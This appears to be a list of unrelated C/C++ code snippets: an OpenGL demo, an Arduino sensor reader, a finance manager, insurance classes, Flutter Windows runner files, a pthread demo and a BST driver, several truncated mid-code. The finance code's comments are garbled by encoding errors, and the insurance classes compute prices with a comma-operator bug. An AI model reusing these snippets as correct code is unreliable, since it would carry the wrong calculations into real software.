    "// Engine\n#include <GL/glew.h>\n#include <GL/glut.h>\n#include <math.h>\n#include <stdio.h>\n#include <string.h>\n#include \"vectors.cpp\"\n#include \"util.cpp\"\n#include \"pipline.cpp\"\n#include \"Shaders.cpp\"\n#include \"glut_backend.cpp\"\n\n#define WINDOW_WIDTH 1920\n#define WINDOW_HEIGHT 1080\n\n\n// IDK (Yet)\nGLuint VBO;\nGLuint IBO;\n\nPersProjInfo gPersProjInfo;\n\n// Loading The Scene\nstatic void RenderSceneCB() {\n    pGameCamera->OnRender();\n    // Clearing the window\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    // Figure Out\n    static float Scale = 0.0f;\n    Scale += 0.1f;\n    Pipeline p;\n    p.Rotate(0.0f, Scale, 0.0f);\n    p.WorldPos(0.0f, 0.0f, 3.0f);\n    //p.SetCamera(*pGameCamera);\n    p.SetPerspectiveProj(gPersProjInfo);\n\n    glUniformMatrix4fv(gWVPLocation, 1, GL_TRUE, (const GLfloat*)p.GetWPTrans());\n    glEnableVertexAttribArray(0);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 0, 0);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, IBO);\n    glDrawElements(GL_TRIANGLES, 12, GL_UNSIGNED_INT, 0);\n    glDisableVertexAttribArray(0);\n    glutSwapBuffers();\n}\n\n// Making The Vectex Buffer\nstatic void CreateVertexBuffer() {\n    Vector3f Vertices[4];\n    Vertices[0] = Vector3f(-1.0f, -1.0f, 0.5773f);\n    Vertices[1] = Vector3f(0.0f, -1.0f, -1.15475f);\n    Vertices[2] = Vector3f(1.0f, -1.0f, 0.5773f);\n    Vertices[3] = Vector3f(0.0f, 1.0f, 0.0f);\n    glGenBuffers(1, &VBO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(Vertices), Vertices, GL_STATIC_DRAW);\n}\n// Making The Index Buffer\nstatic void CreateIndexBuffer() {\n    unsigned int Indices[] = { 0, 3, 1,\n                               1, 3, 2,\n                               2, 3, 0,\n                               0, 1, 2 };\n    glGenBuffers(1, &IBO);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, IBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(Indices), Indices, GL_STATIC_DRAW);\n}",
    "#include <Arduino.h>\n#include <Adafruit_Sensor.h>\n#include <DHT.h>\n#include <DHT_U.h>\n#include <ArduinoJson.h>\n#include \"Pinouts.h\"\n// DHT setup\nDHT_Unified dht(DHT_INPUT, DHT_TYPE);\n\nString dht_sensor_info(String type)\n{\n    sensor_t sensor;\n    (type == \"temp\") ? dht.temperature().getSensor(&sensor) : dht.humidity().getSensor(&sensor);\n    JsonDocument temp_info;\n\n    temp_info[\"name\"] = sensor.name;\n    temp_info[\"version\"] = (sensor.version);\n    temp_info[\"id\"] = (sensor.sensor_id);\n    temp_info[\"values\"] = \"max:\" + String(sensor.max_value) + \";\" + \"min:\" + String(sensor.min_value) + \";\";\n    temp_info[\"res\"] = (sensor.resolution);\n    String output;\n\n    temp_info.shrinkToFit();  // optional\n\n    serializeJson(temp_info, output);\n    return output;\n}\n\nString dht_sensor_get_data(String type)\n{\n    sensors_event_t event;\n    String data;\n    JsonDocument temp_info;\n    (type == \"temp\") ? dht.temperature().getEvent(&event) : dht.humidity().getEvent(&event);\n    if (!isnan((type == \"temp\") ? event.temperature : event.relative_humidity))\n    {\n        temp_info[\"data\"] = String((type == \"temp\") ? event.temperature : event.relative_humidity);\n    }\n    else {\n        temp_info[\"data\"] = \"E:fail(dht_sensor_get_humidity)\";\n    }\n    temp_info.shrinkToFit();\n    serializeJson(temp_info, data);\n    return data;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <unordered_map>\n#include <algorithm>\n\nusing namespace std;\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\nstruct Expense {\n    string category;\n    double amount;\n    string date;\n};\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3\u00e2\nstruct Wallet {\n    string name;\n    double balance;\n\n    // \u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e4\u00eb\u00ff \u00b3\u00ed\u00b3\u00f6\u00b3\u00e0\u00eb\u00b3\u00e7\u00e0\u00f6\u00b3\u00bf \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00ff \u00e7 \u00b3\u00ec'\u00ff\u00ec \u00f2\u00e0 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00ee\u00e2\u00e8\u00ec \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00ee\u00ec\n    Wallet(string walletName, double initialBalance) : name(walletName), balance(initialBalance) {}\n};\n\n// \u00ca\u00eb\u00e0\u00f1 \u00e4\u00eb\u00ff \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00b3\u00ed\u00ed\u00ff \u00f4\u00b3\u00ed\u00e0\u00ed\u00f1\u00e0\u00ec\u00e8\nclass FinanceManager {\nprivate:\n    vector<Wallet> wallets; // \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3 \u00f2\u00e0 \u00bf\u00f5 \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00e8\n    vector<Expense> expenses; // \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n\npublic:\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void addWallet(string walletName) {\n        wallets.push_back(Wallet(walletName, 0.0));\n    }\n\n    // \u00cf\u00ee\u00ef\u00ee\u00e2\u00ed\u00e8\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void deposit(string walletName, double amount) {\n        for (size_t i = 0; i < wallets.size(); ++i) {\n            if (wallets[i].name == walletName) {\n                wallets[i].balance += amount;\n                break;\n            }\n        }\n    }\n\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\u00f3\n    void addExpense(string category, double amount, string date) {\n        expenses.push_back(Expense{ category, amount, date });\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00e4\u00e5\u00ed\u00fc\n    void generateDailyReport(string date) {\n        double totalExpenses = 0.0;\n        cout << \"Daily Report for \" << date << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date == date) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc\n    void generateWeeklyReport(string startDate, string endDate) {\n        double totalExpenses = 0.0;\n        cout << \"Weekly Report from \" << startDate << \" to \" << endDate << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date >= startDate && expenses[i].date <= endDate) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc\n    void generateMonthlyReport(string month) {\n        double totalExpenses = 0.0;\n        cout << \"Monthly Report for \" << month << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date.substr(0, 7) == month) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d4\u00ee\u00f0\u00ec\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00e5\u00e2\u00ed\u00e8\u00e9 \u00ef\u00e5\u00f0\u00b3\u00ee\u00e4 (\u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc \u00e0\u00e1\u00ee \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc)\n    void generateTopExpenses(string periodStart, string periodEnd) {\n        unordered_map<string, double> categorySums; // \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea \u00e4\u00eb\u00ff \u00f1\u00f3\u00ec \u00ea\u00ee\u00e6\u00ed\u00ee\u00bf \u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00bf\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            const Expense& expense = expenses[i];\n            if (expense.date >= periodStart && expense.date <= periodEnd) {\n                categorySums[expense.category] += expense.amount;\n            }\n        }\n\n        // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e5\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00ef\u00e0\u00f0 <\u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00ff, \u00f1\u00f3\u00ec\u00e0> \u00e7\u00b3 \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea\u00e0\n        vector<pair<string, double>> categorySumsVec;\n        categorySumsVec.reserve(categorySums.size());\n        for (auto it = categorySums.begin(); it != categorySums.end(); ++it) {\n            categorySumsVec.push_back(make_pair(it->first, it->second));\n        }\n\n        // \u00d1\u00ee\u00f0\u00f2\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00e7\u00e0 \u00f1\u00ef\u00e0\u00e4\u00e0\u00ed\u00ed\u00ff\u00ec \u00f1\u00f3\u00ec\n        sort(categorySumsVec.begin(), categorySumsVec.end(), [](const pair<string, double>& a, const pair<string, double>& b) {\n            return a.second > b.second;\n            });\n\n        // \u00c2\u00e8\u00e2\u00e5\u00e4\u00e5\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n        cout << \"TOP-3 Expenses for the period \" << periodStart << \" to \" << periodEnd << \":\" << endl;\n        size_t limit = min(static_cast<size_t>(3), categorySumsVec.size());\n        for (size_t i = 0; i < limit; ++i) {\n            cout << i + 1 << \". Category: \" << categorySumsVec[i].first << \", Total amount: \" << categorySumsVec[i].second << endl;\n        }\n    }\n\n    // \u00c7\u00e1\u00e5\u00f0\u00e5\u00e3\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00f2\u00e0 \u00f0\u00e5\u00e9\u00f2\u00e8\u00ed\u00e3\u00e8 \u00f3 \u00f4\u00e0\u00e9\u00eb\n    void saveToFile(string filename) {\n        ofstream outFile(filename);\n        if (outFile.is_open()) {\n            outFile << \"Expenses:\" << endl;\n            size_t expensesSize = expenses.size();\n            for (size_t i = 0; i < expensesSize; ++i) {\n                outFile << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << \", Date: \" << expenses[i].date << endl;\n          ",
    "\ufeff#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <fstream>\n#include <string>\n\nusing namespace std;\nclass Database;\nclass PassportData {\nprivate:\n    int id;\n    string name;\n    string surname;\n    string number;\npublic:\n    PassportData(string name, int id, string surname,\n        string number) : name(name), id(id), surname(surname), number(number) {}\n    virtual ~PassportData() {}\n\n    int getId() const { return id; }\n    string getName() const { return name; }\n    string getSurname() const { return surname; }\n    string getNumber() const { return number; }\n};\nclass Employee {\npublic:\n    Employee(string name, int id, double salary,\n        Database* db) : name(name), id(id), salary(salary), db(db) {}\n    virtual ~Employee() {}\n    virtual void work() = 0;\n    virtual void print_info() const {\n        cout << \"Name: \" << name << \", ID: \" << id << \", Salary: \" << salary << endl;\n    }\n    string getname() { return name; }\n    int getid() { return id; }\n    double getsalary() { return salary; }\n    void setPassportData(PassportData* newpassport) {\n        passport = newpassport;\n    }\nprotected:\n    string name;\n    int id;\n    double salary;\n    Database* db;\n    PassportData* passport;\n};\nclass Policy;\nclass Agent : public Employee {\npublic:\n    Agent(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Agent is working with clients.\" << endl;\n    }\n    void print_info() const {\n        cout << \"\u0418\u043c\u044f \u0430\u0433\u0435\u043d\u0442\u0430: \" << name << \", ID \u0430\u0433\u0435\u043d\u0442\u0430: \" << id << \", \u0437\u0430\u0440\u043f\u043b\u0430\u0442\u0430: \" << salary << endl;\n    }\n    void setprice(int number);\n};\nclass Database; \nclass Manager : public Employee {\npublic:\n    Manager(string name, int id, double salary, Database* db) : Employee(name, id, salary,db) {}\n    void work() override {\n        cout << \"Manager is managing employees.\" << endl;\n    }\n    void addAgent(Agent* agent);\n    void removeAgent(int id);\n};\nclass Policy {\npublic:\n    Policy(int number, double price, double coverage)\n        : number(number), price(price), coverage(coverage) {}\n    virtual ~Policy() {}\n    virtual void print_info() const {\n        cout << \"Number: \" << number << \", Price: \" << price << \", Coverage: \" << coverage << endl;\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    int getnumber() { return number; }\n    double getprice() { return price; }\n    double getcoverage() { return coverage; }\n    virtual string getPolicy() = 0;\nprivate:\n    int number;\n    double price;\n    double coverage;\n};\nclass Car {\nprivate:\n    double price;\n    string type;\npublic:\n    Car(double price, string type) : type(type), price(price) {}\n    string getType() {\n        return type;\n    }\n    double getPrice() const { return price; }\n\n};\nclass PassengerCar : public Car {\npublic:\n    PassengerCar(double price, string type, int seats) : Car(price, type), seats(seats) {}\n    int getSeats() const { return seats; }\n    double getPrice() const { return price * 0, 10 * seats; }\n\nprivate:\n    int seats; // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043c\u0435\u0441\u0442 \u0432 \u043b\u0435\u0433\u043a\u043e\u0432\u043e\u043c \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\n    double price;\n\n};\nclass TruckCar : public Car {\npublic:\n    TruckCar(double price, string type, double loadCapacity) : Car(price, type), loadCapacity(loadCapacity) {}\n    double getLoadCapacity() const { return loadCapacity; }\n    double getPrice() const { return price * 0,010* loadCapacity; }\n\nprivate:\n    double price;\n    double loadCapacity; // \u0413\u0440\u0443\u0437\u043e\u043f\u043e\u0434\u044a\u0435\u043c\u043d\u043e\u0441\u0442\u044c \u0433\u0440\u0443\u0437\u043e\u0432\u0438\u043a\u0430\n};\nclass CarPolicy : public Policy {\nprivate:\n    double price;\n    int number;\n    Car* car;\npublic:\n    CarPolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(600), number(1) {}\n    ~CarPolicy() {}\n    string getPolicy() override {\n        return \"Car_policy\";\n    }\n    void setprice(double newprice) {\n        price = newprice;\n    }\n    void setCar(Car* newCar) {\n        car = newCar;\n    }\n    Car* getCar() const {\n        return car;\n    }\n};\nclass Realty {\nprivate:\n    double price;\n    string type;\npublic:\n    string getType() {\n        return type;\n    }\n    Realty(double price, string type) : type(type), price(price) {}\n    double getPrice() const { return price; }\n};\nclass House : public Realty {\npublic:\n    House(double price, string type, int rooms) : Realty(price, type), rooms(rooms) {}\n    int getRooms() const { return rooms; }\n    double getPrice() const { return price * 0,5 *rooms; }\n\nprivate:\n    int rooms;\n    double price;\n};\nclass Flat : public Realty {\npublic:\n    Flat(double price, string type, int floor) : Realty(price, type), floor(floor) {}\n    int getFloor() const { return floor; }\n    double getPrice() const { return price*0,75* floor; }\nprivate:\n    int floor;\n    double price;\n\n};\nclass HomeInsurancePolicy : public Policy {\npublic:\n    HomeInsurancePolicy(int number, double price, double coverage)\n        : Policy(number, price, coverage), price(2000), number(2) {}\n    ~HomeInsurancePolicy() {}\n    string getPolicy() override {",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <unistd.h>\n\ntypedef struct{\n\tint flag;\n\tchar sym;\n}t_Args;\n\nvoid *first(void *arg1){\n\tstd::cout << \"1st stream started\" << '\\n';\n\tt_Args *args = (t_Args*) arg1;\n\twhile(args->flag == 0){\n\t\tputchar(args->sym);\n\t\tfflush(stdout);\n\t\tsleep(1);\n\t}\n\tstd::cout << \"1st stream stopped\" << '\\n';\n\tpthread_exit((void*)\"first\");\n}\n\nvoid *second(void *arg2){\n\tstd::cout << \"2nd stream started\" << '\\n';\n\tt_Args *args = (t_Args*) arg2;\n\twhile(args->flag == 0){\n\t\tputchar(args->sym);\n\t\tfflush(stdout);\n\t\tsleep(1);\n\t}\n\tstd::cout << \"2nd stream stopped\" << '\\n';\n\tpthread_exit((void*)\"second\");\n}\n\nint main(){\n\tt_Args arg1 = {0, '1'};\n\tt_Args arg2 = {0, '2'};\n\tpthread_t id1, id2;\n\tpthread_create(&id1, nullptr, first, &arg1);\n\tpthread_create(&id2, nullptr, second, &arg2);\n\tstd::cout << \"Enter any character to continue\" << '\\n';\n\tgetchar();\n\tstd::cout << \"Program is working\" << '\\n';\n\targ1.flag = 1;\n\targ2.flag = 1;\n\tchar *ex1, *ex2;\n\tpthread_join(id1, (void**) &ex1);\n\tpthread_join(id2, (void**) &ex2);\n\tstd::cout << \"ex1 = \" << ex1 << '\\n';\n\tstd::cout << \"ex2 = \" << ex2 << '\\n';\n\tstd::cout << \"Program successfully executed!\" << '\\n';\n\treturn 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include \"BST.h\"\n\nusing namespace std;\n\nint main(int argc, char* argv[] ) {\n\n\n    if(argc == 4){\n        BST bst;\n        string file = argv[1];\n        ifstream fin(\"../tests/\" + file);\n        string line;\n        //read file and insert into the tree\n        if (fin.is_open()) {\n            while (getline(fin, line)) {\n                bst.insert(line);\n            }\n        }\n        fin.close();\n\n        std::cout << bst << std::endl;\n        string out_file = argv[2];\n        bst.save_tree_to_file(out_file);\n\n        string test_file = argv[3];\n        ifstream input(\"../tests/\" + test_file);\n        string word;\n        string pure_word;\n        if (input.is_open()) {\n            //loop through each word and search if the word is in the tree\n            while (getline(input, word, ' ')) {\n                bst.search_tree(word);\n            }\n        }\n        input.close();\n    }else{\n        cout<<\"Please enter the required parameters Arg1 = program file(Assignment_3.exe), Arg2 = file name(dictionary.txt), Arg3 = file name (output.txt), Arg4 = file name(test.txt). \\n \"\n              \"Find the output file in output directory\"<<endl;\n    }\n\n\n    return 0;\n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return 